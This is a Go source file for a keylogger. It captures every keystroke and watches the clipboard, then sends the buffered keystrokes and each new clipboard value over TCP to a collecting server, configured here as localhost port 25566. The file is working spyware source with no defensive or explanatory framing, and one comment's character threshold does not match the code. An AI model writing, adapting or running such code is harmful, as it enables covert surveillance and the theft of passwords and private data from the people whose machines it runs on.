package main

import (
	"fmt"
	"net"

	"github.com/atotto/clipboard"
	"github.com/kindlyfire/go-keylogger"
)

func sendStringToTCPSocket(message string, address string) error {
	// Connect to the TCP server
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return err
	}
	defer conn.Close()

	// Send the string over the TCP connection
	_, err = fmt.Fprintf(conn, message)
	if err != nil {
		return err
	}

	return nil
}

func main() {
	// Create a new keylogger object
	kl := keylogger.NewKeylogger()

	// Variable to store the last clipboard text
	var lastClipboardText string

	// Initialize the message string and the server address
	message := ""
	tcpServerAddress := "127.0.0.1:25566"

	// Main loop to capture and write char
	for {
		key := kl.GetKey()

		// If a valid character is present, save it into the message string
		if !key.Empty {
			// Adding the new char in the message string
			message = message + string(key.Rune)
			// Debug: print message buffer
			fmt.Println(message)
			
		}

		// Read the current clipboard text
		clipboardText, err := clipboard.ReadAll()
		if err != nil {
			fmt.Println("Error reading clipboard:", err)
			return
		}

		// If the clipboard text is different from the last one, append it to the message
		if clipboardText != lastClipboardText {
			err := sendStringToTCPSocket(clipboardText, tcpServerAddress)
			if err != nil {
				fmt.Println("Error sending message:", err)
			}
			lastClipboardText = clipboardText
		}

		// If the message string contains more than 50 characters, send it to the server
		if len(message) > 10 {
			// Send the string to the TCP socket
			err := sendStringToTCPSocket(message, tcpServerAddress)
			if err != nil {
				fmt.Println("Error sending message:", err)
				return
			}
			// Reset the message string
			message = ""
		}

	}
}
